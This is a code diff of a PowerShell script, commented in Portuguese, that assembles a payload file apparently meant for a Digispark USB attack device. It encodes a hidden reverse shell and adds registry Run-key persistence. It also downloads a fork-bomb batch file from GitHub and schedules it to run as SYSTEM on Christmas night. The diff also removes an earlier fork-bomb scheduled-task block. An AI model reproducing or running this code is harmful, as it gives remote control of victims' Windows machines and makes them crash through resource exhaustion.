@@ -1,9 +1,3 @@
-###############################################################
-#                                                             #
-#                      SHELL - REVERSO                        #
-#                                                             #
-###############################################################
-
 # Define Payload de Shell-Reverso
 $x = @'
 $ip = '127.0.0.1';
@@ -21,30 +15,18 @@ $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-Str
 $ShellReverseEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($x))
 
 # Monta o arquivo payload linha a linha
-Write-Output '# Shell Reverso' > .\payload.txt
-Write-Output "powershell -W hidden -e $ShellReverseEncoded" >> .\payload.txt
-Write-Output 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persist /d "C:\Windows\payload.bat"' >> .\payload.txt
-
-###############################################################
-#                                                             #
-#                      FORK - BOMB                            #
-#                                                             #
-###############################################################
+Write-Output '# Salva o comando de shell reversa em uma variavel' > .\payload.txt
+Write-Output "`$cmd = `"$ShellReverseEncoded`"" >> .\payload.txt
+Write-Output '# Salva a shell reversa e define a pesistencia atraves do registry' >> .\payload.txt
+Write-Output 'echo "powershell -W hidden -e $cmd" > C:\Windows\Temp\payload.bat' >> .\payload.txt
+Write-Output 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persist /d "C:\Windows\Temp\payload.bat"' >> .\payload.txt
 
 
+# Monta a part do Fork Bomb no arquivo
+Write-Output '# Baixa o fork bomb e define para executar na noite de natal' >> .\payload.txt
+Write-Output 'Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/bomb.bat?raw=true -o C:\Windows\Temp\bomb.bat' >> .\payload.txt
+Write-Output 'schtasks /create /RU "system" /sc once /sd "12/25/2022" /st "22:45" /tr C:\Windows\Temp\bombt.bat /rl highest /tn "bomb"' >> .\payload.txt
 
-# Inicio Fork Bomb
-Write-Output '# Bomb' >> .\payload.txt
-
-# Cria o arquivo Fork-Bomb
-Write-Output 'Write-Output "For(){ Sajb{ For(){ } } }" | Out-File C:\Windows\bomb.ps1' >> .\payload.txt
-# define o que vai ser rodado e seus parâmetros
-Write-Output '$actions = (New-ScheduledTaskAction -Execute "C:\Windows\bomb.ps1" -Argument Hidden)'  >> .\payload.txt
-# define o gatilho que desencadeará a ação
-Write-Output '$trigger = New-ScheduledTaskTrigger -Daily -At "12:00 PM" -DaysInterval 2'  >> .\payload.txt
-# define o usuário e nível de privilégio
-Write-Output '$principal = New-ScheduledTaskPrincipal -UserId "Administrator" -RunLevel Highest'  >> .\payload.txt
-# cria a tarefa a partir dos dados anteriores 
-Write-Output '$task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger'  >> .\payload.txt
-# registra a tarefa no agendador de tarefas
-Write-Output 'Register-ScheduledTask "bomb" -InputObject $task'  >> .\payload.txt
+#Executa a shell reversa
+Write-Output '# Invoca a shell reversa' >> .\payload.txt
+Write-Output "powershell -e `$cmd" >> .\payload.txt
